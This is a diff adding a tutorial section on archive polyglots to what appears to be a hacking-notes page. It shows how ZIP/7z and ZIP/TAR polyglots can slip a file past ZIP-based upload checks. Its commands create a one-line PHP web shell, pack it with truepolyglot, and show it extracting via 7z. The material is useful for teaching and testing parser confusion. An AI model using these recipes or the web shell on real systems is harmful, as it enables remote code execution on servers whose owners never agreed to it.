@@ -135,3 +135,114 @@ By default, the `tar` command will allow storing and extracting symlinks:
 </strong>$ tar -tvf payload.tar    # View to confirm symlink was added
 lrwxrwxrwx user/user     0 2023-00-00 00:00 link -> /etc/passwd
 </code></pre>
+
+## Polyglots
+
+A "polyglot" is defined in English as a person who speaks multiple languages. When talking about file formats, this means a _file that can be interpreted in multiple ways_. These are useful for various reasons, mainly confusing parsers. A check might use one parser, but when using the file it will be parsed differently bypassing the check.&#x20;
+
+Archive files have a few interesting properties of flexibility that make it fairly straightforward to create one file that extracts in two different ways depending on the tool used to inspect/extract it.&#x20;
+
+To understand why tricks work and to **come up with your own**, look at the [@corkami/pics](https://github.com/corkami/pics/tree/master/binary) repository which has simple but useful images for many file formats, including archives.&#x20;
+
+### ZIP file extracting as 7z
+
+When some code tries to validate a ZIP file before extracting it, there is a high chance you can confuse it somehow to have the _check_ parse it differently than the _extraction_. One such example is using [ZIP](https://github.com/corkami/pics/blob/master/binary/ZIP.png) files combined with [7z](https://github.com/corkami/pics/blob/master/binary/7zip.png). This is possible because **a ZIP file is parsed from the end**, while a .7z file is parsed from the start recognized by its magic bytes!
+
+A useful tool that can help us with this is [`truepolyglot`](https://github.com/ansemjo/truepolyglot) which has a `zipany` mode that can prefix a ZIP file with any content, and fix the offsets so it unzips without any errors. When we prefix a regular ZIP file with a 7z file, it will result in a special polyglot file that is a valid ZIP with some content, but `7z x` extracts it with the .7z's content. This confusion may bypass some checks.
+
+<pre class="language-shell-session"><code class="lang-shell-session">$ echo dummy > file.txt
+<strong>$ zip file.zip file.txt  # Prepare ZIP (carrier)
+</strong>
+$ echo '&#x3C;?php system($_GET["cmd"]) ?>' > shell.php
+<strong>$ 7z a shell.7z shell.php  # Prepare 7z (payload)
+</strong>
+# # Combine into polyglot file
+<strong>$ truepolyglot zipany --payload1file shell.7z --zipfile file.zip polyglot.zip
+</strong></code></pre>
+
+This created a `polyglot.zip` file which has the properties described above, confusing ZIP parsers thinking it is an innocent file, but has different contents when extracting using `7z x`:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ unzip -l polyglot.zip  # Shows only file.txt
+</strong>  Length      Date    Time    Name
+---------  ---------- -----   ----
+        8  2023-10-18 20:52   file.txt
+---------                     -------
+        8                     1 file
+<strong>$ 7z x polyglot.zip  # Only warnings, no errors
+</strong>
+WARNINGS:
+There are data after the end of archive
+
+WARNING:
+polyglot.zip
+Can not open the file as [zip] archive
+The file is open as [7z] archive
+...
+
+Everything is Ok
+
+Warnings: 1
+Size:       30
+Compressed: 328
+<strong>$ ls -l  # Writes shell.php instead
+</strong>-rw-r--r-- 1 j0r1an j0r1an 10414 Oct 18 21:04 polyglot.zip
+-rw-r--r-- 1 j0r1an j0r1an    15 Oct 18 21:00 shell.php
+</code></pre>
+
+### ZIP magic bytes as TAR
+
+In the previous trick, we learned that [ZIP](https://github.com/corkami/pics/blob/master/binary/ZIP.png) gets parsed from the end of the file. This can bypass most parsers and doesn't require the _first_ bytes to be the magic bytes in the file. In specific cases, however, this might not be enough, and you do need control over the start of the file to set the ZIP magic bytes for example. Then the trick above wouldn't work because the .7z format has its own.
+
+To solve this, [TAR ](https://github.com/corkami/pics/blob/master/binary/TAR.png)can be used which does not require magic bytes at the start of the file like ZIP. When you try to create a raw `.tar` file using `tar -cf`, you may notice that it immediately starts with the filename you added:
+
+<pre class="language-shell-session"><code class="lang-shell-session">$ touch ABCDEFGH
+<strong>$ tar -cf test.tar ABCDEFGH
+</strong><strong>$ hd test.tar 
+</strong>00000000  41 42 43 44 45 46 47 48  00 00 00 00 00 00 00 00  |ABCDEFGH........|
+00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+...
+</code></pre>
+
+This can be abused to overwrite this filename with the ZIP magic bytes, which will happily be parsed as a filename. By overwriting these bytes, we bypass the magic bytes at the start of the file, and during extraction, the rest of the files in the TAR will be extracted.&#x20;
+
+<pre class="language-shell-session"><code class="lang-shell-session">$ echo 'dummy' > file.txt
+$ zip file.zip file.txt  # Prepare ZIP (carrier)
+
+$ echo '&#x3C;?php system($_GET["cmd"]) ?>' > shell.php
+$ touch $'PK\x03\x04'
+<strong>$ tar -cf shell.tar $'PK\x03\x04' shell.php  # Prepare TAR (payload)
+</strong>
+# # Combine into polyglot file
+<strong>$ truepolyglot zipany --payload1file shell.tar --zipfile file.zip polyglot.zip
+</strong></code></pre>
+
+The `shell.tar` file will have the correct magic bytes already, which are kept after the `truepolyglot` in the final `polyglot.zip` file. This will have ZIP magic bytes, be a valid parsable ZIP file, and at the same time be recognized as TAR by `7z`. See the following demo:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ head -c 4 polyglot.zip | hd  # Correct magic bytes
+</strong>00000000  50 4b 03 04           |PK..|
+00000004
+<strong>$ unzip -l polyglot.zip  # Shows only file.txt
+</strong>  Length      Date    Time    Name
+---------  ---------- -----   ----
+        8  2023-10-18 20:52   file.txt
+---------                     -------
+        8                     1 file
+<strong>$ 7z x polyglot.zip  # Only warnings, no errors
+</strong>
+WARNINGS:
+There are data after the end of archive
+
+WARNING:
+polyglot.zip
+Can not open the file as [zip] archive
+The file is open as [tar] archive
+...
+Everything is Ok
+
+Warnings: 1
+Size:       15
+Compressed: 10414
+<strong>$ ls -l  # Writes shell.php instead
+</strong>-rw-r--r-- 1 j0r1an j0r1an 10414 Oct 18 21:04 polyglot.zip
+-rw-r--r-- 1 j0r1an j0r1an    15 Oct 18 21:00 shell.php
+</code></pre>
